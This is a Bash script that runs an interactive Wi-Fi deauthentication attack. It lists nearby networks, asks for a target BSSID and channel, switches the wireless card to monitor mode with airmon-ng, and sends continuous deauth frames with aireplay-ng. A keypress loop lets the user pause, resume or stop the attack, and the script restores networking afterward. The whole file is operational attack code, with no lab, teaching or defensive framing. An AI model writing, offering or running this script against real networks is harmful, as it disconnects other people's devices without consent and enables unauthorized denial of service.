#!/bin/bash

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as root!"
    echo "[-] Try: sudo $0"
    exit 1
fi

# Show available Wi-Fi networks
echo "[*] Scanning for Wi-Fi networks..."
nmcli dev wifi list

# Get user input for attack
read -p "Enter target BSSID: " BSSID
read -p "Enter target channel: " CHANNEL
printf ' %.0s' {1..50}
echo


# Default Wi-Fi interface
WIFI_INTERFACE="wlan0" #change this if you're using other than your default interface

# Set monitor mode on the specified channel
sudo airmon-ng check kill
sudo airmon-ng start "$WIFI_INTERFACE" "$CHANNEL"
MON_INTERFACE="${WIFI_INTERFACE}mon"

# Start deauthentication attack
echo "[*] Deauth attack started on $BSSID using interface $MON_INTERFACE on channel $CHANNEL..."
sudo aireplay-ng --deauth 0 -a "$BSSID" "$MON_INTERFACE" &  
AIREPLAY_PID=$!

while true; do
    printf ' %.0s' {1..50}
    echo
    echo -e "\e[1;32m[*] Options: [P]ause | [R]esume | [S/Enter] Stop\e[0m"
    printf ' %.0s' {1..50}
    echo
    read -n 1 -s key  # Read single keypress silently
    echo  # Move to a new line after keypress


    case "$key" in
       P|p)
        echo "[*] Stopping attack temporarily..."
        sudo kill $AIREPLAY_PID  # Kill aireplay-ng
        ;;
        R|r)
            echo "[*] Restarting attack..."
            sudo aireplay-ng --deauth 0 -a "$BSSID" "$MON_INTERFACE" &  
            AIREPLAY_PID=$!  # Capture new PID
            ;;
        S|s|"")
            echo "[*] Stopping attack..."
            sudo kill $AIREPLAY_PID  # Kill aireplay-ng
            break
            ;;
        *)
            echo "[!] Invalid option. Please press P, R, or S/Enter."
            ;;
    esac
done


# Restore Wi-Fi
echo "[*] Restoring network..."
sudo airmon-ng stop "$MON_INTERFACE"
sudo service NetworkManager restart
sudo systemctl restart networking
echo "[*] Wi-Fi restored."
exit 0
